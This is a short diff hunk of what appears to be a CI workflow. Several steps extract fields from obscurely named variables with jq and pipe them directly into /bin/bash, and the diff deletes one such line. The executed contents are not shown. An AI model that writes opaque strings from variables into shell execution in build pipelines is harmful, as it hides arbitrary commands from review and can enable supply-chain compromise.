@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$mia93" | jq -r .xi64 | /bin/bash
           echo $wwvx6385 | jq -r .ek3012 | /bin/bash
           printf '%s' "$vv96" | jq -r .pbp28169 | /bin/bash
-          printf '%s' "$ecrjk034" | jq -r .ovs0024 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
